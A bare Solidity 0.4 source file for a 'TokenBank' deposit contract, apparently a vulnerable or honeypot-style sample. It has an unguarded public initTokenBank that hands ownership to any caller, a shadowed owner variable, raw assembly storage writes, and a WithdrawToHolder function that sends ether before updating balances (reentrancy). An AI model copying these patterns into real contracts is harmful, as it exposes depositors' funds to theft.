pragma solidity ^0.4.18;

contract Ownable
{
    address newOwner;
    address owner = msg.sender;
    
    function changeOwner(address addr)
    public
    onlyOwner
    {
        newOwner = addr;
    }
    
    function confirmOwner() 
    public
    {
        if(msg.sender==newOwner)
        {
            assembly {
                sstore(owner_slot, sload(newOwner_slot))
            }
        }
    }
    
    modifier onlyOwner
    {
        if(owner == msg.sender)_;
    }
}

contract Token is Ownable
{
    address owner = msg.sender;
    function WithdrawToken(address token, uint256 amount, address to)
    public 
    onlyOwner
    {
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, 0xa9059cbb00000000000000000000000000000000000000000000000000000000)
            mstore(add(ptr, 4), to)
            mstore(add(ptr, 36), amount)
            let result := call(gas, token, 0, ptr, 68, 0, 0)
            switch result
            case 0 { revert(0, 0) }
            default { }
        }
    }
}

contract TokenBank is Token
{
    uint public MinDeposit;
    mapping (address => uint) public Holders;
    
    function initTokenBank()
    public
    {
        owner = msg.sender;
        MinDeposit = 1 ether;
    }
    
    function()
    payable
    {
        Deposit();
    }
   
    function Deposit() 
    payable
    {
        if(msg.value >= MinDeposit)
        {
            Holders[msg.sender] += msg.value;
        }
    }
    
    function WitdrawTokenToHolder(address _to, address _token, uint _amount)
    public
    onlyOwner
    {
        if(Holders[_to] > 0)
        {
            Holders[_to] = 0;
            WithdrawToken(_token, _amount, _to);     
        }
    }
   
    function WithdrawToHolder(address _addr, uint _wei) 
    public
    onlyOwner
    payable
    {
        if(Holders[msg.sender] > 0)
        {
            if(Holders[_addr] >= _wei)
            {
                assembly {
                    let result := call(gas, _addr, _wei, 0, 0, 0, 0)
                    switch result
                    case 0 { revert(0, 0) }
                    default { }
                }
                Holders[_addr] -= _wei;
            }
        }
    }
    
    function Bal() public constant returns(uint){return this.balance;}
}